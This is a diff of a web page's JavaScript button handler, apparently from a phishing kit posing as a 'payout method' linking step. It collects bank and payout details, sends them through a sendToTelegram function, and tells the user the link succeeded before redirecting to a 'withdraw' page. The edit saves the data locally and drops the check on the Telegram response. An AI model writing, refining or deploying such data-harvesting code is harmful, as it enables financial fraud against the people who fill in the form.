@@ -2855,13 +2855,13 @@ MAIN BUTTON HANDLER
 -------------------------- */
 document.getElementById('nextBtnSeparate').addEventListener('click', async () => {
 
-  // 1. Check validation. If incomplete, halt execution.
+  // 1. FIRST check validation. If incomplete, stop right here.
   if (!validateCurrentPreference()) {
     showNotification("Please fill out all required fields for your selected payment method", 7000);
     return; 
   }
 
-  // 2. Notify user that verification is in progress
+  // 2. Show the verification progress message
   showNotification("Verifying payout information...", 2500);
 
   const data = {
@@ -2893,28 +2893,21 @@ document.getElementById('nextBtnSeparate').addEventListener('click', async () =>
     acuAccountUk: document.getElementById("acuAccount-uk")?.value.trim()
   };
 
+  localStorage.setItem("section3Data", JSON.stringify(data));
+
   try {
-    // 3. Send to Telegram and verify response state
-    const response = await sendToTelegram(data);
-    
-    if (response.ok) {
-      // Save data locally ONLY after confirmation of message submission
-      localStorage.setItem("section3Data", JSON.stringify(data));
-      
-      showNotification("Payout method linked successfully", 3000);
+    // 3. Exact original Telegram request execution
+    await sendToTelegram(data);
+    showNotification("Payout method linked successfully", 3000);
 
-      // Brief delay to allow the user to read the notification before redirecting
-      setTimeout(() => {
-        window.location.href = "https://membership.avalonflow.site/withdraw";
-      }, 1500);
-
-    } else {
-      throw new Error(`Telegram API responded with status ${response.status}`);
-    }
+    // Brief delay to allow the notification to display before redirecting
+    setTimeout(() => {
+      window.location.href = "https://membership.avalonflow.site/withdraw";
+    }, 1500);
 
   } catch (err) {
     console.error("Telegram send failed:", err);
-    showNotification("Failed to link payout method. Please try again.", 5000);
+    showNotification("Failed to link payout method. Please try again", 5000);
   }
 });
 
